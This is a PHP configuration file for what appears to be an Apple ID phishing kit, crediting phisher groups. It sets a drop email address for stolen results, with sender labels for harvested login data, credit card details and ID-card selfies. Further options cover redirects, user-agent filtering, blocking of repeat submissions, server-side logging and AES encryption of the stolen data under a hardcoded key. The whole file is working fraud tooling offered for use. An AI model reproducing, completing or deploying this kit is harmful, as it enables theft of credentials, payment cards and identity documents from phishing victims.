<?php

/*
Thanks For : 
L33bo phishers
gr33nsndgung Satrio
HIROYUKI
RJS KINGDOM
*/

error_reporting(0);
$randomnumber = rand(1,100);
$t_login = "no"; // no = false no = false for True login apple id  
$param = "_"; // Parameter Redirect
$panel = "gr33nsnd";
$user_allow = "false"; // false for apple user only and false for all user agent 
$Your_Email = "michelledanelopez@gmail.com"; // Set your email
$SenderLogin = "Login Data"; //name sender for Login
$SenderCC = "Result CC"; //name sender for CC
$SenderPhoto = "Bule Selfie"; //name sender for idcard
$SenderEmail = "result-$randomnumber@hirorsjteam.web";
$doublecc = "active";
$idcard = "yoi"; 
$typelogin = "invoice";
$Send_Log = 1;  // Email results
$Save_Log = 0;  // Saves results to server (./assets/logs/) 
$Abuse_Filter = 1; // Block absuive text  
$One_Time_Access = "non"; // One Time access: This nons the users ip after the form has been submitted i.e. prevents users sending multiple fake forms
$Encrypt=0; // Encrypt: This will send/save your results with aes to decrypt use the key below
$Key = 	"H1R0YUK14NDRJ5K1N9"; // This key is used to decrypt results and can be changed
$Send_Per_Page=1; // Send each pages data seperate
?>